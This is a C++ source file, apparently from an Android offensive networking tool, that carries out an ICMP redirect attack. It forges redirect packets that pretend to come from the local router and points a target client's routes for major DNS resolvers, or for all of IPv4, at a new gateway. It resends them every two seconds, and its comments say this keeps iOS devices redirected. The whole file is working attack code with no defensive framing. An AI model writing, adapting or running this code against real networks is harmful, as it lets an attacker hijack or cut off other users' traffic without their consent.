#include "icmp_redirect.h"
#include <android/log.h>
#include <cstring>
#include <thread>
#include <mutex>
#include <atomic>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>

#define LOG_TAG "ICMPRedirect"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// Global state
static std::atomic<bool> g_icmp_active(false);
static std::thread *g_icmp_thread = nullptr;
static std::atomic<bool> g_icmp_stop(false);
static int g_icmp_raw_sock = -1;
static ICMPRedirectTarget g_current_icmp_target;

// Checksum for ICMP
static uint16_t icmp_checksum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len / 2; i++) {
        sum += buf[i];
    }
    if (len % 2) {
        sum += ((uint8_t *)buf)[len - 1];
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)~sum;
}

// Build and send an ICMP Redirect packet
static int send_icmp_redirect(int raw_sock, const char *iface,
                               const uint8_t *client_mac, uint32_t client_ip,
                               uint32_t router_ip, uint32_t gateway_to_advertise,
                               uint32_t dest_ip, const uint8_t *client_mac_bytes) {
    uint8_t buffer[1024];
    memset(buffer, 0, sizeof(buffer));

    // Get router MAC bytes
    uint8_t router_mac[6];
    if (sscanf(g_current_icmp_target.router_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &router_mac[0], &router_mac[1], &router_mac[2],
               &router_mac[3], &router_mac[4], &router_mac[5]) != 6) {
        LOGE("Failed to parse router MAC");
        return -1;
    }

    // --- Ethernet header ---
    struct ether_header *eth = (struct ether_header *)buffer;
    memcpy(eth->ether_dhost, client_mac, 6);
    memcpy(eth->ether_shost, router_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    // --- IP header ---
    struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ether_header));
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    // total_len filled later
    ip->id = htons(0x4242);
    ip->frag_off = 0;
    ip->ttl = 255;              // Must be 255 for iOS to accept redirect
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = router_ip;      // Spoofed as the legitimate gateway
    ip->daddr = client_ip;

    // --- ICMP header + payload ---
    // ICMP Redirect (Type 5, Code 0 = Redirect for network, Code 1 = Redirect for host)
    struct icmphdr *icmp = (struct icmphdr *)(buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
    icmp->type = 5;  // ICMP_REDIR
    icmp->code = 1;  // Redirect for host
    icmp->checksum = 0;
    icmp->un.gateway = gateway_to_advertise;  // The "better" gateway (client's own IP)

    // ICMP redirect payload must include the original triggering packet's IP header + 8 bytes
    // We craft a minimal "original packet" that triggered this redirect
    uint8_t *orig_pkt = (uint8_t *)(buffer + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct icmphdr));
    struct iphdr *orig_ip = (struct iphdr *)orig_pkt;
    orig_ip->version = 4;
    orig_ip->ihl = 5;
    orig_ip->tos = 0;
    orig_ip->tot_len = htons(40);
    orig_ip->id = 0;
    orig_ip->frag_off = 0;
    orig_ip->ttl = 64;
    orig_ip->protocol = IPPROTO_TCP;
    orig_ip->saddr = client_ip;
    orig_ip->daddr = dest_ip;
    orig_ip->check = 0;
    orig_ip->check = icmp_checksum((uint16_t *)orig_ip, sizeof(struct iphdr));

    // Add 8 bytes of original TCP header (src port, dst port, seq)
    uint8_t *orig_tcp = orig_pkt + sizeof(struct iphdr);
    orig_tcp[0] = 0x30; orig_tcp[1] = 0x39; // src port 12345
    orig_tcp[2] = 0x00; orig_tcp[3] = 0x50; // dst port 80

    int icmp_payload_len = sizeof(struct iphdr) + 8; // IP header + 8 bytes
    int icmp_total_len = sizeof(struct icmphdr) + icmp_payload_len;
    int ip_total_len = sizeof(struct iphdr) + icmp_total_len;
    int total_len = sizeof(struct ether_header) + ip_total_len;

    // Fill IP total length
    ip->tot_len = htons(ip_total_len);
    ip->check = 0;
    ip->check = icmp_checksum((uint16_t *)ip, sizeof(struct iphdr));

    // Fill ICMP checksum
    icmp->checksum = icmp_checksum((uint16_t *)icmp, icmp_total_len);

    // Send it
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    dest.sll_ifindex = if_nametoindex(iface);
    dest.sll_halen = 6;
    memcpy(dest.sll_addr, client_mac, 6);
    dest.sll_protocol = htons(ETHERTYPE_IP);

    ssize_t sent = sendto(raw_sock, buffer, total_len, 0,
                          (struct sockaddr *)&dest, sizeof(dest));
    if (sent > 0) {
        LOGD("  Sent ICMP Redirect: %s says gateway for %s is %s",
             inet_ntoa(*(struct in_addr *)&router_ip),
             inet_ntoa(*(struct in_addr *)&dest_ip),
             inet_ntoa(*(struct in_addr *)&gateway_to_advertise));
        return (int)sent;
    }
    LOGE("  Failed to send ICMP Redirect: %s", strerror(errno));
    return -1;
}

// Main ICMP redirect thread
static void icmp_redirect_thread_func() {
    LOGD("ICMP redirect thread starting on %s", g_current_icmp_target.interface_name.c_str());

    // Create raw socket
    g_icmp_raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_IP));
    if (g_icmp_raw_sock < 0) {
        LOGE("Failed to create raw socket: %s", strerror(errno));
        return;
    }

    // Bind to interface
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, g_current_icmp_target.interface_name.c_str(), IFNAMSIZ - 1);
    if (setsockopt(g_icmp_raw_sock, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        LOGE("Failed to bind to interface %s: %s", g_current_icmp_target.interface_name.c_str(), strerror(errno));
        close(g_icmp_raw_sock);
        g_icmp_raw_sock = -1;
        return;
    }

    uint8_t client_mac[6];
    if (sscanf(g_current_icmp_target.client_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &client_mac[0], &client_mac[1], &client_mac[2],
               &client_mac[3], &client_mac[4], &client_mac[5]) != 6) {
        LOGE("Failed to parse client MAC");
        close(g_icmp_raw_sock);
        g_icmp_raw_sock = -1;
        return;
    }

    uint32_t client_ip = inet_addr(g_current_icmp_target.client_ip.c_str());
    uint32_t router_ip = inet_addr(g_current_icmp_target.router_ip.c_str());

    LOGD("ICMP redirect targeting %s (%s) via router %s",
         g_current_icmp_target.client_ip.c_str(), g_current_icmp_target.client_mac.c_str(),
         g_current_icmp_target.router_ip.c_str());

    int cycle_count = 0;
    while (!g_icmp_stop) {
        if (g_current_icmp_target.redirect_all) {
            // Cover entire IPv4 space with two redirects:
            // 0.0.0.0/1 and 128.0.0.0/1
            uint32_t half1_start = 0;
            uint32_t half2_start = htonl(0x80000000); // 128.0.0.0

            // Also redirect common destinations specifically
            uint32_t common_dsts[] = {
                inet_addr("0.0.0.0"),     // Default route
                inet_addr("8.8.8.8"),
                inet_addr("8.8.4.4"),
                inet_addr("1.1.1.1"),
                inet_addr("1.0.0.1"),
                inet_addr("208.67.222.222"),
                inet_addr("208.67.220.220"),
                0
            };

            for (int i = 0; common_dsts[i] != 0; i++) {
                if (g_icmp_stop) break;
                send_icmp_redirect(g_icmp_raw_sock,
                                   g_current_icmp_target.interface_name.c_str(),
                                   client_mac, client_ip, router_ip,
                                   client_ip, // Advertise client as the gateway
                                   common_dsts[i],
                                   client_mac);
                usleep(10000); // 10ms between each
            }

            // Cover /1 ranges
            if (!g_icmp_stop) {
                send_icmp_redirect(g_icmp_raw_sock,
                                   g_current_icmp_target.interface_name.c_str(),
                                   client_mac, client_ip, router_ip,
                                   client_ip, half1_start, client_mac);
                usleep(10000);
            }
            if (!g_icmp_stop) {
                send_icmp_redirect(g_icmp_raw_sock,
                                   g_current_icmp_target.interface_name.c_str(),
                                   client_mac, client_ip, router_ip,
                                   client_ip, half2_start, client_mac);
                usleep(10000);
            }
        } else {
            // Redirect specific destination
            uint32_t target_dst = inet_addr(g_current_icmp_target.target_dst.c_str());
            send_icmp_redirect(g_icmp_raw_sock,
                               g_current_icmp_target.interface_name.c_str(),
                               client_mac, client_ip, router_ip,
                               client_ip, target_dst, client_mac);
        }

        cycle_count++;
        // iOS flushes dynamic routes periodically — re-fire every 2 seconds
        int sleep_cycles = 200;
        for (int i = 0; i < sleep_cycles && !g_icmp_stop; i++) {
            usleep(10000); // 10ms
        }
    }

    close(g_icmp_raw_sock);
    g_icmp_raw_sock = -1;
    LOGD("ICMP redirect thread stopped. Cycles: %d", cycle_count);
}

bool icmp_redirect_init() {
    LOGD("Initializing ICMP redirect operations");
    return true;
}

bool icmp_redirect_start(const ICMPRedirectTarget &target) {
    LOGD("Starting ICMP redirect attack against %s on %s",
         target.client_ip.c_str(), target.interface_name.c_str());

    if (g_icmp_active.load()) {
        LOGE("ICMP redirect already active");
        return false;
    }

    g_current_icmp_target = target;
    g_icmp_stop = false;

    try {
        g_icmp_thread = new std::thread(icmp_redirect_thread_func);
        g_icmp_active = true;
        LOGD("✓ ICMP redirect attack started");
        return true;
    } catch (const std::exception &e) {
        LOGE("Failed to start thread: %s", e.what());
        return false;
    }
}

void icmp_redirect_stop() {
    LOGD("Stopping ICMP redirect");
    if (!g_icmp_active.load()) return;

    g_icmp_stop = true;
    if (g_icmp_raw_sock >= 0) {
        close(g_icmp_raw_sock);
        g_icmp_raw_sock = -1;
    }
    if (g_icmp_thread && g_icmp_thread->joinable()) {
        g_icmp_thread->join();
        delete g_icmp_thread;
        g_icmp_thread = nullptr;
    }
    g_icmp_active = false;
    LOGD("✓ ICMP redirect stopped");
}

bool icmp_redirect_is_active() {
    return g_icmp_active.load();
}

void icmp_redirect_cleanup() {
    LOGD("Cleaning up ICMP redirect");
    icmp_redirect_stop();
}
